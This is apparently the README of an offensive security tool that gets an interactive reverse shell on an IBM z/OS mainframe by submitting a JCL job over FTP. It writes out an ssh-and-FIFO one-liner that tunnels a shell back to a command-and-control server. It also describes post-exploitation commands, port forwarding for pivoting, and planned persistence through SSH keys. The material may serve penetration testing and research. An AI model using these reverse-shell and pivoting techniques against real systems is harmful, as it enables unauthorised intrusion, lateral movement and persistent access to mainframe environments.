# zos-pivoting

Library set to get a secure reverse shell by submitting a JCL job via FTP on z/OS.

```
$ python ftp2shell.py config.ini
Input the password for zuser on target.mainframe.net:

Save the pulic key below in ~ccserveraccount/.ssh/authorized_keys

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+og7UDXjtluvauvB3Uo7eFqYGTDYlptkd[...]

Press Enter to continue...
mf.bigiron.local> uname
OS/390
mf.bigiron.local> exit
This will terminate the connection to mf.bigiron.local, are you sure? (y/N) y
```

The library contains:

 * `config.ini` a sample configuration file
 * `ftp2shell.py` the main script, it uses the config file and the next items
 * `reverseshellmanager.py` uses `zosutils/wrappingshell.py` to get a nice interactive shell with some post-exploitation commands
 * `zosutils/stdiotranscoder.py` wraps the stdin/stdout of a command and performs transparent re-encoding (EBCDIC to UTF8 or other encodings supported by python). In other words: makes nc/ncat support EBCDIC and other character encoding systems
 * `zosutils/wrappingshell.py` uses the stdio transcoder to run a asynchronous/asynchronous shell via `nc` or similar
 * `zosutils/zosftp.py` talks FTP and uses the extra features of the FTP server in z/OS
 * `zosutils/jcl.py` to generate JCL cards
 * `sshutils/ssh_utils.py` generation and management of SSH keys and fingerprinting

The python files in the root of the project exhibit a lower coding quality than the others.

## Design
This project uses the new SSH stdin and stout redirection to get a fully interactive reverse shell on a mainframe.

Here is an example:

```
ssh -i $KEYNAME $CCU@$CCS -p $CCP -o UserKnownHostsFile=$KNOWNHOSTSFILE -o StrictHostKeyChecking=yes -N \
-W $NCIP:$NCP < $FIFONAME | sh -s > $FIFONAME 2>&1 & echo $STARTSEND > $FIFONAME'
```

SSH tunnels stdin and stdout, piping to a shell.
A FIFO file contains all the inputs and outputs to and from the shell.
Please note how awesome the strong host fingerprint checking and the key-based authentication are.

The same principle can be applied to other systems running SSH.

You have to do the cleanup by yourself.

Python >= 3.7 only.

## Requirements
You have to create a user in your machine to get the reverse connection on your `cc_server` (see the config file).
The user does not need an interactive shell.

## Dependencies
Python >= 3.7.

You can install the [ebcdic](https://pypi.org/project/ebcdic/) package to support more character encodings.

The default EBCDIC support in Python 3 should be enough most of the time.

## Usage:
 * Edit `config.ini`
 * Run `python ftp2shell.py config.ini`. The script will:
    - connect to the mainframe via FTP
    - generate and run a JCL batch
    - start an SSH connection against `cc_server` and start a tunneled clear-text shell
    - start the shell management
 * The resulting shell is a nearly full-featured SH shell.
The SSH tunnelling protects the shell.
 * There is a custom `_runssh` command which can be used to run further SSH commands.
Think port forwarding and that goodness.
For example, to get access to TN3270 on your localhost run:
```
mainframe> _runssh -R 2222:localhost:23
```
And then connect to localhost:2222.

## Future Steps
* Automate the pivoting by parsing the output of netstat/NETSTAT and:
    - ssh -R
    - ssh -L
    - starting a local sshd
* Persistence via SSH keys (?)
* Port to other systems

## Can't do on z/OS
* Cannot automate running custom sshd server:
    * sshd has no run permissions for users by default
    * copying the binary to another path will not work, as a daemon need to be marked as `program controlled`
    * ***z/OS 2.4 will probably get the latest and greatest OpenSSH with full `-R` support***
